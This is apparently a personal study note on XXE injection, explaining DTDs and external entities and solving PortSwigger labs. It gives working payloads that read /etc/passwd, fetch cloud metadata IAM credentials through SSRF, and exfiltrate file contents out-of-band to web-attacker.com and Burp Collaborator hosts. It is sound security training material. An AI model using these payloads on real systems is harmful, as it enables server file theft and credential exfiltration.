XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.
![[Pasted image 20260128154907.png]]
# What is XML?
XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data.
# What is document type definition?
The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional `DOCTYPE` element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.
# What are XML custom entities?
XML allows custom entities to be defined within the DTD. For example:
`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`
This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: "`my entity value`".
# What are XML external entities?
XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL. The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded. For example:
`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`
The URL can use the `file://` protocol, and so external entities can be loaded from file. For example:
`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`
## What are the types of XXE attacks?
- #### Exploiting XXE to retrieve files {my-arrow|#adfcf9|12}
	 *To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:*
    1. Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
    2. Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.
	    *For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:*
		`<?xml version="1.0" encoding="UTF-8"?> <stockCheck><productId>381</productId></stockCheck>`
		
		The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload:
		
		`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>`
		
		This XXE payload defines an external entity `&xxe;` whose value is the contents of the `/etc/passwd` file and uses the entity within the `productId` value. This causes the application's response to include the contents of the file:
		
		`Invalid product ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...`
- #### Exploiting XXE to perform SSRF attacks {my-arrow2|#ff0035|9}
- #### Exploiting blind XXE exfiltrate data out-of-band
	Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

	*There are two broad ways in which you can find and exploit blind XXE vulnerabilities:*
	1. {my-arrow3|#ecebeb|6} You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data. 
	2. You can trigger XML parsing errors in such a way that the error messages contain sensitive data.
	
	Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.
	
	An example of a malicious DTD to exfiltrate the contents of the `/etc/passwd` file is as follows:
	`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> %eval; %exfiltrate;` {my-arrow4|#3595da|15}
	
	This DTD carries out the following steps:
	- Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
	- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.
	- Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
	- Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.
- #### {my-arrow5|#7E57C2|3} Exploiting blind XXE to retrieve data via error messages
	You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:
	`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;`
	
	This DTD carries out the following steps:
	- Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
	- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error`. The `error` entity will be evaluated by loading a nonexistent file whose name contains the value of the `file` entity.
	- Uses the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed.
	- Uses the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.


## Labs
* #Portswigger
	1. **Exploiting XXE using external entities to retrieve files** #APPRENTICE {my-arrow}
		normal XXE attack to retrieve `etc/passwd` file with no defenses
		*Payload :*
		`<?xml version="1.0" encoding="UTF-8"?>`
		`<!DOCTYPE adel [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ] >`
		`<stockCheck><productId>&xxe;</productId><storeId>&xxe;</storeId></stockCheck>`
	2. **Exploiting XXE to perform SSRF attacks** #APPRENTICE {my-arrow2}
		same as the last lab but this lab teach you how to send request to internal resource "SSRF attack"
		*Payload :*
		`<?xml version="1.0" encoding="UTF-8"?>`
		`<!DOCTYPE anything [ <!ENTITY dula SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&dula;</productId><storeId>&dula;</storeId></stockCheck>`
	3. **Blind XXE with out-of-band interaction** #PRACTITIONER {my-arrow3}
		it is doing the same as past labs and sending HTTP request to our website and test for DNS lookup if we found it so it is an indication for that the website is vulnerable to XXE but do not return the response *(BLIND)*
		*Payload :*
		`<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
	4. **Blind XXE with out-of-band interaction via XML parameter entities** #PRACTITIONER 
		in this lab the developer blocked regular entities and do some input validation so we had to tweak the payload and use the percentage rather that the ampersand, the website blocks this `&xxe;` so we will not reference to it and create a payload that uses parameter entities
		*Payload :*
		`<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`
	5. **Exploiting blind XXE to exfiltrate data using a malicious external DTD** #PRACTITIONER 
		in this lab we will create a DTD in our server and load it in the target website
		*Our DTD file :*
		`<!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %eval; %exfil;`
		*Payload :*
		`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
	6. {my-arrow5} **Exploiting blind XXE to retrieve data via error messages** #PRACTITIONER 
		this lab force you to trigger an error that will expose a sensitive data so i have create this file on my lab
		*DTD File :*
		`<!ENTITY % file SYSTEM "file:///etc/passwd">`
		`<!ENTITY % runner "<!ENTITY &#x25; error SYSTEM 'file:///ahmedadelmohamed/%file;'>">`
		i chose to git non exist file which is `ahmedadelmohamed` and this is the line that triggers error
		*Payload :*
		`<!DOCTYPE dula [`
		`<!ENTITY % loader SYSTEM "https://exploit-0ae80077046cd329826e3c95015a00ee.exploit-server.net/exploit">`
		`%loader;`
		`%runner;`
		`%error;`
		`]>`
	7. **Exploiting XInclude to retrieve files** #PRACTITIONER 
		add this payload to the `productid` parameter
		*Payload :*
		`<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>`
	8. **Exploiting XXE via image file upload** #PRACTITIONER 
		Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.
		For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.
		in this lab we have to upload a true XML file that retrieve the hostname
		*Payload :*
		`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
	9. **Exploiting XXE to retrieve data by repurposing a local DTD** #EXPERT 
		

# NOTES
- {my-arrow4} This technique might not work with some file contents, including the newline characters contained in the `/etc/passwd` file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as `/etc/hostname` can be targeted instead. 